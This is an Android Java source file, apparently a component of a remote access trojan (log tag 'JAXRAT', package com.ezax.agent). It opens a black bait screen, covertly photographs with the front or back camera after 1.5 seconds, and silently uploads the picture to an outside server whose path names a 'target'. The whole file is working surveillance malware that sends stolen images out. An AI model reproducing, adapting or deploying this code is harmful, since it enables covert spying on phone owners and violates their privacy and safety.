package com.ezax.agent;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.widget.FrameLayout;
import androidx.core.app.ActivityCompat;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class CameraActivity extends Activity {
    private Camera camera;
    private int cameraId = 0;
    private boolean isFront = false;
    private String serverUrl = "https://ax.pythonanywhere.com/api/upload_image/hp_target_1"; // PASTIKAN IP INI SESUAI

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            finish(); return;
        }

        isFront = getIntent().getBooleanExtra("FRONT", false);

        // Bikin layar hitam (SurfaceView) sebagai pancingan
        FrameLayout layout = new FrameLayout(this);
        SurfaceView surfaceView = new SurfaceView(this);
        layout.addView(surfaceView);
        setContentView(layout);

        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
            @Override
            public void surfaceCreated(SurfaceHolder holder) {
                try {
                    Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                    for (int camIdx = 0; camIdx < Camera.getNumberOfCameras(); camIdx++) {
                        Camera.getCameraInfo(camIdx, cameraInfo);
                        if (isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                            cameraId = camIdx; break;
                        } else if (!isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                            cameraId = camIdx; break;
                        }
                    }

                    camera = Camera.open(cameraId);
                    camera.setPreviewDisplay(holder);
                    camera.startPreview();

                    // Otomatis jepret setelah 1.5 detik
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try {
                            camera.takePicture(null, null, (data, cam) -> {
                                uploadImage(data);
                            });
                        } catch (Exception e) {
                            Log.e("JAXRAT", "Gagal jepret otomatis", e);
                            finish();
                        }
                    }, 1500);

                } catch (Exception e) {
                    Log.e("JAXRAT", "Kamera gagal dibuka", e);
                    finish();
                }
            }
            @Override public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}
            @Override public void surfaceDestroyed(SurfaceHolder holder) {}
        });
    }

    private void uploadImage(byte[] imageBytes) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                String boundary = "***";
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream request = new DataOutputStream(conn.getOutputStream());
                request.writeBytes("--" + boundary + "\r\n");
                request.writeBytes("Content-Disposition: form-data; name=\"image\";filename=\"image.jpg\"\r\n\r\n");
                request.write(imageBytes);
                request.writeBytes("\r\n--" + boundary + "--\r\n");
                request.flush(); request.close();
                conn.getResponseCode();
            } catch (Exception e) { }
            
            // Tutup Activity setelah upload
            runOnUiThread(this::finish); 
        }).start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (camera != null) {
            try { camera.stopPreview(); camera.release(); } catch (Exception e) {}
            camera = null;
        }
    }
}
